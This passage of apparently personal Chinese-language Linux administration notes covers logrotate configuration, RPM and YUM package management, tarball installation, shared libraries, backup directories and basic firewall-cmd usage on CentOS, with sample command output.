udev rule: 40-redhat-cpu-hotplug.rules<br>Sep 24 16:26:49 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: Skipping udev rule: 91-permissions.rules<br>Sep 24 16:26:49 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: *** Including module: pollcdrom ***<br>Sep 24 16:26:49 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: *** Including module: systemd ***<br>Sep 24 16:26:50 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: *** Including module: usrmount ***<br>Sep 24 16:26:50 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: *** Including module: base ***<br>Sep 24 16:26:50 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: *** Including module: fs-lib ***<br>Sep 24 16:26:50 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: *** Including module: kdumpbase ***<br>Sep 24 16:26:50 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: *** Including module: shutdown ***<br><br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="logrotate"><a href="#logrotate" class="headerlink" title="logrotate"></a>logrotate</h3><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>&#x2F;etc&#x2F;logrotate.conf:主要的参数文件,默认配置文件</p><p>&#x2F;etc&#x2F;logrotate.d:文件目录</p><p>logrotate会对每个日志文件进行记录备份,如果进行了三次备份就开始删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># cat /etc/logrotate.conf | grep  &quot;^[^#]&quot; </span><br>weekly    <span class="hljs-comment">#默认一周轮询一次</span><br>rotate 4  <span class="hljs-comment">#保留几个日志文件</span><br>create    <span class="hljs-comment">#由于日志文件被改名因此建立一个新的来存储是意思</span><br>dateext   <span class="hljs-comment">#轮询的文件名称会加上日期</span><br>include /etc/logrotate.d <span class="hljs-comment">#这个目录的所有文件都来执行轮询任务</span><br>/var/log/wtmp &#123; <span class="hljs-comment">#针对这个目录所设置的参数</span><br>    monthly<br>    create 0664 root utmp<br>minsize 1M<br>    rotate 1<br>&#125;<br>/var/log/btmp &#123;<br>    missingok<br>    monthly<br>    create 0600 root utmp<br>    rotate 1<br>&#125;<br></code></pre></td></tr></table></figure><p>对于logrotate.d目录下的文件来说</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH logrotate.d]<span class="hljs-comment"># cat syslog </span><br>/var/log/cron<br>/var/log/maillog<br>/var/log/messages<br>/var/log/secure<br>/var/log/spooler<br>&#123;<br>sharedscripts<br>dateext<br>rotate 25<br>size 40M<br>compress<br>dateformat  -%Y%m%d%s<br>postrotate<br>/bin/kill -HUP `<span class="hljs-built_in">cat</span> /var/run/syslogd.pid 2&gt; /dev/null` 2&gt; /dev/null || <span class="hljs-literal">true</span><br>endscript<br>&#125;<br><br><span class="hljs-comment">#该文件结构为</span><br><span class="hljs-comment">#文件名</span><br><span class="hljs-comment">#&#123;</span><br><span class="hljs-comment">#  sharedscriptes</span><br><span class="hljs-comment"># 执行的脚本prerotate在logrotate执行之前执行,postrotate在昨晚logrotate之后启动命令</span><br><span class="hljs-comment">#  endscript</span><br><span class="hljs-comment">#&#125;</span><br></code></pre></td></tr></table></figure><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>如果要对&#x2F;var&#x2F;log&#x2F;admin.log添加a+属性并且</p><p>日志一个月轮询一次</p><p>如果大于10M立即轮询</p><p>保存5个文件</p><p>备份压缩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH logrotate.d]<span class="hljs-comment"># cat admin </span><br>/var/log/admin.log&#123;<br>monthly<br>size=10M<br>rotate 5<br>compress<br>sharedscripts<br>prerotate<br>/usr/bin/chattr chattr -a /var/log/admin.log<br>endscript<br>sharedscripts<br>postrotate<br>/usr/bin/chattr chattr +a /var/log/admin.log<br>endscript<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><p>在软件源代码中makefile用来管理一系列哪些文件编译先编译哪些后编译</p><p>make这个命令就需要makefile</p><p>操作系统中最好安装make与autoconfig一个是用来编译的，另一个是用来检测是否有makefile文件</p><h3 id="常用安装软件"><a href="#常用安装软件" class="headerlink" title="常用安装软件"></a>常用安装软件</h3><p>RPM:Centos常用(软件管理):软件安装的环境必须与打包的环境需求一致或相当,满足软件依赖,反安装时需要特别小心最底层的软件不要先删除否则可能系统出现问题,不能安装其他Linux发行版本&#x2F;var&#x2F;lib&#x2F;rpm</p><blockquote><p>为了解决不能安装其他的Linux发行版本出了个SRPM,里面包含源码,与Tarball不同的是这里面还包含所需要的依赖</p><p>先将软件以RPM的方式编译此时变成RPM文件</p><p>然后编译好的RPM安装到Linux中</p><p>文件名通常为.src.rpm</p></blockquote><p>dpkg:Ubuntu常用(软件管理)</p><p>yum:Centos软件升级,更新&#x2F;var&#x2F;cache&#x2F;yum</p><p>apt-get:Ubuntu软件升级</p><blockquote><p><a href="https://www.cnblogs.com/gshelldon/p/13276253.html">https://www.cnblogs.com/gshelldon/p/13276253.html</a></p><p>RPM包名解析</p></blockquote><h4 id="RPM安装"><a href="#RPM安装" class="headerlink" title="RPM安装"></a>RPM安装</h4><p>rpm -ivh XXXX.rpm</p><ul><li>–nodeps:软件因为依赖问题无法安装但是执意安装</li><li>–replacefiles:已经安装在你的系统上面,又或者出现版本不合信息</li><li>–replacepkgs:某个软件已经安装过了</li><li>–force:上面两个的综合体</li><li>–test:测试找到依赖</li><li>–justdb:由于RPM数据库损坏或因为某些原因产生故障</li><li>–nosignaturn:跳过数字签名</li><li>–prefix 新路径:安装到非正规路径</li><li>–noscripts:不想让该软件在安装过程中自行执行某些系统命令</li></ul><h4 id="RPM的升级与更新"><a href="#RPM的升级与更新" class="headerlink" title="RPM的升级与更新"></a>RPM的升级与更新</h4><p>-Uvh:没有安装就安装,如果是旧版本直接更新</p><p>-Fvh:没有安装不安装,只有已经安装的软件会升级</p><h4 id="RPM查询"><a href="#RPM查询" class="headerlink" title="RPM查询"></a>RPM查询</h4><p>-qa:查询所有</p><p>-q:仅仅查询后接软件是否安装</p><p>-qi:列出软件的详细信息</p><p>-ql:列出文件与目录所在的文件名</p><p>-qc:列出配置文件</p><p>-qd:列出所有说明文档</p><p>-qR:列出软件的依赖</p><p>-qf:找出该文件属于哪个已经安装的软件</p><p>-q –scripts:列出是否包含需要安装后执行的脚本</p><h4 id="RPM认证与数字签名"><a href="#RPM认证与数字签名" class="headerlink" title="RPM认证与数字签名"></a>RPM认证与数字签名</h4><p>-V:后接软件名显示该软件被修改的内容</p><p>-Va:显示所有软件被修改的内容</p><p>-Vp:列出软件可能被修改的文件</p><p>-Vf:显示某个文件是否被修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># rpm -Va</span><br>S.5....T.  c /etc/infiniband/openib.conf<br>.......T.  c /etc/modprobe.d/ib_ipoib.conf<br>.......T.    /etc/udev/rules.d/10-knem.rules<br>S.5....T.  c /etc/NetworkManager/NetworkManager.conf<br>missing     /var/run/abrt<br>.M.......  g /var/lock/iscsi<br>.M.......  g /var/lock/iscsi/lock<br>....L....  c /etc/pam.d/fingerprint-auth<br>....L....  c /etc/pam.d/password-auth<br>....L....  c /etc/pam.d/postlogin<br>....L....  c /etc/pam.d/smartcard-auth<br>....L....  c /etc/pam.d/system-auth<br>S.5....T.  c /etc/security/limits.conf<br>S.5....T.  c /etc/security/limits.d/20-nproc.conf<br></code></pre></td></tr></table></figure><p>前面几个字段</p><p>S代表容量改变, M代表文件的属性或类型被改变, 5代表MD5这一种校验值的内容已经不同了, D代表主&#x2F;次代码已经改变, L代表连接文件路径已经改变, U代表文件所属用户已经改变, G代表文件所属用户组已经改变, T代表文件的建立时间已经改变, P代表功能已经改变</p><p>后面的代表c:配置文件 ,d:数据文件 ,g:幽灵文件(通常该文件不被某个软件所包含) ,l:许可认证文件 ,r:自述文件</p><p>安装数字签名</p><blockquote><p>rpm –import 数字签名文件</p><p>#查找数字前面方式</p><p>locate GPG-KEY</p><p>find ‘*GPG-KEY*‘</p><p>#首先使用这个查找数字签名的公钥</p><p>rpm -qa | grep pubkey</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># rpm -qa | grep pubkey</span><br>gpg-pubkey-352c64e5-52ae6884<br>gpg-pubkey-f4a80eb5-53a7ff4b<br></code></pre></td></tr></table></figure><p>#在根据数字签名公钥名来查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># rpm -qi  gpg-pubkey-352c64e5-52ae6884</span><br>Name        : gpg-pubkey<br>Version     : 352c64e5<br>Release     : 52ae6884<br>Architecture: (none)<br>Install Date: Tue 05 Nov 2019 10:55:36 PM CST<br>Group       : Public Keys<br>Size        : 0<br>License     : pubkey<br>Signature   : (none)<br>Source RPM  : (none)<br>Build Date  : Mon 16 Dec 2013 10:42:12 AM CST<br>Build Host  : localhost<br>Relocations : (not relocatable)<br>Packager    : Fedora EPEL (7) &lt;epel@fedoraproject.org&gt;<br>Summary     : gpg(Fedora EPEL (7) &lt;epel@fedoraproject.org&gt;)<br>Description :<br>-----BEGIN PGP PUBLIC KEY BLOCK-----<br>Version: rpm-4.11.3 (NSS-3)<br><br>mQINBFKuaIQBEAC1UphXwMqCAarPUH/ZsOFslabeTVO2pDk5YnO96f+rgZB7xArB<br>OSeQk7B90iqSJ85/c72OAn4OXYvT63gfCeXpJs5M7emXkPsNQWWSju99lW+AqSNm<br>jYWhmRlLRGl0OO7gIwj776dIXvcMNFlzSPj00N2xAqjMbjlnV2n2abAE5gq6VpqP<br>vFXVyfrVa/ualogDVmf6h2t4Rdpifq8qTHsHFU3xpCz+T6/dGWKGQ42ZQfTaLnDM<br>jToAsmY0AyevkIbX6iZVtzGvanYpPcWW4X0RDPcpqfFNZk643xI4lsZ+Y2Er9Yu5<br>S/8x0ly+tmmIokaE0wwbdUu740YTZjCesroYWiRg5zuQ2xfKxJoV5E+Eh+tYwGDJ<br>n6HfWhRgnudRRwvuJ45ztYVtKulKw8QQpd2STWrcQQDJaRWmnMooX/PATTjCBExB<br>9dkz38Druvk7IkHMtsIqlkAOQMdsX1d3Tov6BE2XDjIG0zFxLduJGbVwc/6rIc95<br>T055j36Ez0HrjxdpTGOOHxRqMK5m9flFbaxxtDnS7w77WqzW7HjFrD0VeTx2vnjj<br>GqchHEQpfDpFOzb8LTFhgYidyRNUflQY35WLOzLNV+pV3eQ3Jg11UFwelSNLqfQf<br>uFRGc+zcwkNjHh5yPvm9odR1BIfqJ6sKGPGbtPNXo7ERMRypWyRz0zi0twARAQAB<br>tChGZWRvcmEgRVBFTCAoNykgPGVwZWxAZmVkb3JhcHJvamVjdC5vcmc+iQI4BBMB<br>AgAiBQJSrmiEAhsPBgsJCAcDAgYVCAIJCgsEFgIDAQIeAQIXgAAKCRBqL66iNSxk<br>5cfGD/4spqpsTjtDM7qpytKLHKruZtvuWiqt5RfvT9ww9GUUFMZ4ZZGX4nUXg49q<br>ixDLayWR8ddG/s5kyOi3C0uX/6inzaYyRg+Bh70brqKUK14F1BrrPi29eaKfG+Gu<br>MFtXdBG2a7OtPmw3yuKmq9Epv6B0mP6E5KSdvSRSqJWtGcA6wRS/wDzXJENHp5re<br>9Ism3CYydpy0GLRA5wo4fPB5uLdUhLEUDvh2KK//fMjja3o0L+SNz8N0aDZyn5Ax<br>CU9RB3EHcTecFgoy5umRj99BZrebR1NO+4gBrivIfdvD4fJNfNBHXwhSH9ACGCNv<br>HnXVjHQF9iHWApKkRIeh8Fr2n5dtfJEF7SEX8GbX7FbsWo29kXMrVgNqHNyDnfAB<br>VoPubgQdtJZJkVZAkaHrMu8AytwT62Q4eNqmJI1aWbZQNI5jWYqc6RKuCK6/F99q<br>thFT9gJO17+yRuL6Uv2/vgzVR1RGdwVLKwlUjGPAjYflpCQwWMAASxiv9uPyYPHc<br>ErSrbRG0wjIfAR3vus1OSOx3xZHZpXFfmQTsDP7zVROLzV98R3JwFAxJ4/xqeON4<br>vCPFU6OsT3lWQ8w7il5ohY95wmujfr6lk89kEzJdOTzcn7DBbUru33CQMGKZ3Evt<br>RjsC7FDbL017qxS+ZVA/HGkyfiu4cpgV8VUnbql5eAZ+1Ll6Dw==<br>=hdPa<br>-----END PGP PUBLIC KEY BLOCK-----<br></code></pre></td></tr></table></figure></blockquote><p>反安装一定要&#x3D;&#x3D;从上层往下层&#x3D;&#x3D;卸载,如果rpm数据库损坏可以使用rpm –rebuilddb来重建</p><h4 id="YUM"><a href="#YUM" class="headerlink" title="YUM"></a>YUM</h4><ul><li><p>–installroot&#x3D;&#x2F;some&#x2F;path:将软件安装在&#x2F;some&#x2F;path下面</p></li><li><p>-y:自动输入yes</p></li><li><p>search:查找软件名或者是描述的重要关键字</p></li><li><p>list:列出目前安装的所有</p></li><li><p>info:同上(数据更详细)</p><ul><li>&#96;&#96;&#96;bash<br>[root@YH ~]# yum info samba<br>Loaded plugins: fastestmirror, langpacks<br>Loading mirror speeds from cached hostfile<br>Installed Packages<br>Name        : samba            #软件名<br>Arch        : x86_64           #CPU硬件架构名<br>Version     : 4.10.16          #软件版本<br>Release     : 15.el7_9         #发布版本<br>Size        : 2.2 M<br>Repo        : installed        #安装状态<br>From repo   : updates<br>Summary     : Server and Client software to interoperate with Windows machines<br>URL         : <a href="http://www.samba.org/">http://www.samba.org/</a><br>License     : GPLv3+ and LGPLv3+<br>Description : Samba is the standard Windows interoperability suite of programs for Linux and<br>        : Unix.<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>- install<br><br>- update<br><br>- remove<br><br>- repolist all:列出所有库源<br><br>- grouplist:列出所有可使用的软件群组<br><br>- groupinfo:后接groupname可以了解group内含的所有软件名<br><br>- groupinstall:安装一组<br><br>- groupremove:删除某个软件群组<br><br>yum组群配置文件<span class="hljs-regexp">/etc/yum</span>.conf有些组群中的软件因为是可选安装所以默认不安装,需要修改这个文件将可选安装改成默认安装<br><br><br><br>yum配置文件位置 <span class="hljs-regexp">/etc/yum</span>.repos.d/CentO S-Base.repo<br><br>内容<br><br>```bash<br>[extras]<br>gpgcheck=<span class="hljs-number">1</span><br>gpgkey=http:<span class="hljs-regexp">//mi</span>rrors.tencentyun.com<span class="hljs-regexp">/centos/</span>RPM-GPG-KEY-CentOS-<span class="hljs-number">7</span><br>enabled=<span class="hljs-number">1</span><br>baseurl=http:<span class="hljs-regexp">//mi</span>rrors.tencentyun.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/extras/</span><span class="hljs-variable">$basearch</span>/<br>name=Qcloud centos extras - <span class="hljs-variable">$basearch</span><br>[os]<br>gpgcheck=<span class="hljs-number">1</span><br>gpgkey=http:<span class="hljs-regexp">//mi</span>rrors.tencentyun.com<span class="hljs-regexp">/centos/</span>RPM-GPG-KEY-CentOS-<span class="hljs-number">7</span><br>enabled=<span class="hljs-number">1</span><br>baseurl=http:<span class="hljs-regexp">//mi</span>rrors.tencentyun.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/os/</span><span class="hljs-variable">$basearch</span>/<br>name=Qcloud centos os - <span class="hljs-variable">$basearch</span><br>[updates]    <span class="hljs-comment">#软件源名称不能重复不重要</span><br>gpgcheck=<span class="hljs-number">1</span>   <span class="hljs-comment">#检查数字签名</span><br>gpgkey=http:<span class="hljs-regexp">//mi</span>rrors.tencentyun.com<span class="hljs-regexp">/centos/</span>RPM-GPG-KEY-CentOS-<span class="hljs-number">7</span> <span class="hljs-comment">#数字签名公钥位置</span><br>enabled=<span class="hljs-number">1</span>   <span class="hljs-comment">#是否启用</span><br>baseurl=http:<span class="hljs-regexp">//mi</span>rrors.tencentyun.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/updates/</span><span class="hljs-variable">$basearch</span>/ <span class="hljs-comment">#软件源实际位置</span><br>name=Qcloud centos updates - <span class="hljs-variable">$basearch</span>  <span class="hljs-comment">#说明一下名称</span><br>~                                        <br></code></pre></td></tr></table></figure></li></ul></li></ul><p>&#x3D;&#x3D;如果你修改了软件源但是无用需要清空一些缓存yum clean [all|package|headers]&#x3D;&#x3D;因为服务器会将软件信息先缓存放到&#x2F;var&#x2F;cache&#x2F;yum里面</p><h4 id="扩展软件源地址"><a href="#扩展软件源地址" class="headerlink" title="扩展软件源地址"></a>扩展软件源地址</h4><p><a href="http://dl.fedoraproject.org/pub/epel/7/x86_64/">http://dl.fedoraproject.org/pub/epel/7/x86_64/</a></p><p>还有ELRepo软件源</p><h3 id="Tarball"><a href="#Tarball" class="headerlink" title="Tarball"></a>Tarball</h3><p>由于是使用c语言写的所以大部分平台都可以使用</p><p>在Centos或Red Hat中要安装一些tarball软件要选择Development Tools以及Kernel Source Development的相关包</p><p>如果安装gcc等开发工具使用 yum groupinstall “Development Tools”</p><p>如果安装图形用户界面支持一般还要安装，yum groupinstall “X Software Development”</p><p>安装的软件较为旧则可能需要yum groupinstall “Legacy Software Development”</p><h4 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h4><ol><li>将tarball文件在&#x2F;usr&#x2F;local&#x2F;src下面解压</li><li>查看解压下面的README&#x2F;INSTALL并安装依赖(必要)</li><li>建立makefile:以自动检测程序测试操作系统环境(configure或config)</li><li>用make并用目录下的makefile作为参数</li><li>根据install这个目标的指定来安装到正确的路径</li></ol><p>安装时候运行的命令</p><p>.&#x2F;configure:建立Makefile文件</p><p>make clean (读取makefile中的clean工作,虽然不一定有效但是可以清除目标文件)</p><p>make编译</p><p>make install</p><blockquote><p>如果安装一个独立的目录,例如&#x2F;usr&#x2F;local&#x2F;package这样需要将这个软件的man page手动写入&#x2F;etc&#x2F;man_db.conf中</p></blockquote><p>软件建议安装在&#x2F;usr&#x2F;local,而源代码安装在&#x2F;usr&#x2F;local&#x2F;src</p><h3 id="使用RPM还是Tarball"><a href="#使用RPM还是Tarball" class="headerlink" title="使用RPM还是Tarball"></a>使用RPM还是Tarball</h3><ul><li>优先使用原厂的RPM功能</li><li>使用软件官网发布的RPM或是提供的软件源地址</li><li>使用Tarball安装特殊软件</li><li>用Tarball测试软件,(如果已经有一个旧版本了但是防止新版本会导致什么问题所以可以使用Tarball来安装防止影响到原来的软件)</li></ul><h4 id="利用默认值安装SRPM文件-–rebuid-x2F-–recomplie"><a href="#利用默认值安装SRPM文件-–rebuid-x2F-–recomplie" class="headerlink" title="利用默认值安装SRPM文件(–rebuid&#x2F;–recomplie)"></a>利用默认值安装SRPM文件(–rebuid&#x2F;–recomplie)</h4><p>rpmbuild –rebuid 后接*.src.rpm文件(仅仅编译与打包)</p><p>运行后生成一个*.rpm</p><p>rpmbuild –recomplie 后接srpm文件(编译打包安装)</p><p>rpmbuild -ba 软件:打包生成rpm与srpm</p><p>rpmbuild -bb 软件:打包成rpm</p><h4 id="Linux发行默认用到的路径"><a href="#Linux发行默认用到的路径" class="headerlink" title="Linux发行默认用到的路径"></a>Linux发行默认用到的路径</h4><p>以apache为例子:</p><p>&#x2F;etc&#x2F;httpd&#x2F;&#x2F;配置文件</p><p>&#x2F;usr&#x2F;lib&#x2F;&#x2F;函数库</p><p>&#x2F;usr&#x2F;bin&#x2F;&#x2F;执行文件</p><p>&#x2F;usr&#x2F;share&#x2F;man&#x2F;&#x2F;联机文档</p><p>如果默认放在&#x2F;usr&#x2F;local里面就会可能变成(实际根据makefile)</p><p>&#x2F;usr&#x2F;local&#x2F;etc&#x2F;</p><p>&#x2F;usr&#x2F;local&#x2F;lib&#x2F;</p><p>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;</p><p>&#x2F;usr&#x2F;local&#x2F;man&#x2F;</p><p>因为Tarball反安装比较难所以建议</p><ul><li>将Tarball数据解压到&#x2F;usr&#x2F;local&#x2F;src中</li><li>安装时最好考虑安装到&#x2F;usr&#x2F;local这个默认目录</li><li>考虑未来的反安装做好可以将每个软件单独安装在&#x2F;usr&#x2F;local下面</li><li>为安装到单独目录的软件man Page加入man path查找(加入安装到&#x2F;usr&#x2F;local&#x2F;software,那么在&#x2F;etc&#x2F;man_db.conf中大约40~50行写入MANPATH_MAP &#x2F;usr&#x2F;local&#x2F;software)</li></ul><p>升级使用.patch文件来进行更新</p><h3 id="动态与静态函数库"><a href="#动态与静态函数库" class="headerlink" title="动态与静态函数库"></a>动态与静态函数库</h3><h4 id="静态"><a href="#静态" class="headerlink" title="静态"></a>静态</h4><ul><li>扩展名一般为libXXX.a</li><li>编译操作:文件会较大一些</li><li>独立执行的状态</li><li>如果想升级需要重新编译</li></ul><h4 id="动态"><a href="#动态" class="headerlink" title="动态"></a>动态</h4><ul><li>扩展名一般为libXXX.so</li><li>编译操作:由于只有一个指针被整合到执行文件中所以文件会比较小</li><li>独立执行的状态:不能独立执行,程序需要去读取库函数,库函数的目录也不能改变</li><li>如果要升级直接更换指向就可以了</li></ul><p>大部分函数库都是动态的</p><p>函数库一般放在&#x2F;lib与&#x2F;lib64里面,内核的函数库放在&#x2F;lib&#x2F;modules里面</p><h4 id="提高函数库的速度"><a href="#提高函数库的速度" class="headerlink" title="提高函数库的速度"></a>提高函数库的速度</h4><ul><li><p>将函数库加载到告诉缓存中,必须将函数库写入&#x2F;etc&#x2F;ld.so.conf(这里面只能写入文件不能写入目录)</p></li><li><p>利用idconfig来加载这个文件</p><ul><li>-f conf:使用conf来代替&#x2F;etc&#x2F;ld.so.conf</li><li>-C cache:指定某个文件为高速缓存</li><li>-p:列出目前所有的函数库内容</li></ul></li><li><p>同时将记录保存到&#x2F;etc&#x2F;ld.so.cache</p></li><li><p>ldd</p><ul><li>-v:列出所有内容信息</li><li>-d:重新将数据有遗失的连接点显示出来</li><li>-r:将ELF有关的错误内容显示出来</li></ul></li></ul><h2 id="最后的几个命令"><a href="#最后的几个命令" class="headerlink" title="最后的几个命令"></a>最后的几个命令</h2><ul><li>nmcli:查看网络</li><li>timedatectl 时间查看 [set-time 时间]进行时间设置</li><li>ntpdate:时间矫正</li><li>localectl :查看语言 [set-locale LANG&#x3D;语言]设置语言</li><li>dmidecode:查看硬件设备<ul><li>常用检测硬件信息命令</li><li>gdisk:分区</li><li>dmesg:内核运行的各项信息</li><li>vmstat:可分析系统目前的状态</li><li>lspci:列出整个PC的PCI接口设备</li><li>lsusb:列出USB信息</li><li>iostat:列出整个CPU与连接的输入输出设备</li></ul></li><li>smartd提供了smartctl命令来检测硬盘是好是坏</li></ul><p>查看cpu<a href="https://www.cnblogs.com/hapday/p/6336905.html">https://www.cnblogs.com/hapday/p/6336905.html</a></p><h3 id="备份-1"><a href="#备份-1" class="headerlink" title="备份"></a>备份</h3><p>推荐的备份目录</p><ul><li>&#x2F;etc</li><li>&#x2F;home</li><li>&#x2F;root</li><li>&#x2F;var&#x2F;spool&#x2F;mail,&#x2F;var&#x2F;spool&#x2F;cron&#x2F;,&#x2F;var&#x2F;spool&#x2F;at</li><li>&#x2F;var&#x2F;lib</li></ul><p>不推荐备份的目录</p><ul><li>&#x2F;dev</li><li>&#x2F;proc,&#x2F;sys,&#x2F;run</li><li>&#x2F;mnt,&#x2F;media</li><li>&#x2F;tmp</li></ul><p>常用备份工具dd、cpio、xfsdump、xfsrestore</p><p><a href="https://www.cnblogs.com/wanao/p/12838917.html">https://www.cnblogs.com/wanao/p/12838917.html</a></p><h2 id="内核源代码目录"><a href="#内核源代码目录" class="headerlink" title="内核源代码目录"></a>内核源代码目录</h2><p><a href="https://blog.csdn.net/zn2857/article/details/78804818">https://blog.csdn.net/zn2857/article/details/78804818</a></p><h3 id="Nginx服务的安装与配置"><a href="#Nginx服务的安装与配置" class="headerlink" title="Nginx服务的安装与配置"></a>Nginx服务的安装与配置</h3><p><a href="https://www.runoob.com/linux/nginx-install-setup.html">https://www.runoob.com/linux/nginx-install-setup.html</a></p><p>如果访问不到请开放端口或关闭<a href="#%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a></p><h2 id="云服务器安装samba"><a href="#云服务器安装samba" class="headerlink" title="云服务器安装samba"></a>云服务器安装samba</h2><p>腾讯云为了安全禁用了samba的两个端口地址需要改映射</p><p><a href="https://blog.csdn.net/zsdt345a780rfajwet/article/details/107845859">https://blog.csdn.net/zsdt345a780rfajwet/article/details/107845859</a></p><h2 id="日志文件服务器"><a href="#日志文件服务器" class="headerlink" title="日志文件服务器"></a>日志文件服务器</h2><p>配置很简单就不做了</p><h3 id="创建自己的服务"><a href="#创建自己的服务" class="headerlink" title="创建自己的服务"></a>创建自己的服务</h3><p>只需要创建一个.sh的脚本文件在任何文件夹</p><p>然后写一个&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;*.service的配置文件与刚刚的脚本文件建立关联就可以使用systemctl进行管理了</p><h2 id="安装jdk"><a href="#安装jdk" class="headerlink" title="安装jdk"></a>安装jdk</h2><p><a href="https://blog.csdn.net/pdsu161530247/article/details/81582980">https://blog.csdn.net/pdsu161530247/article/details/81582980</a></p><p>source让配置文件生效</p><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>firewall-cmd –list-ports查看开启 或者iptables -nL</p><p>查看版本： firewall-cmd –version</p><p>查看帮助： firewall-cmd –help</p><p>显示状态： firewall-cmd –state</p><p>查看所有打开的端口： firewall-cmd –zone&#x3D;public –list-ports</p><p>更新防火墙规则： firewall-cmd 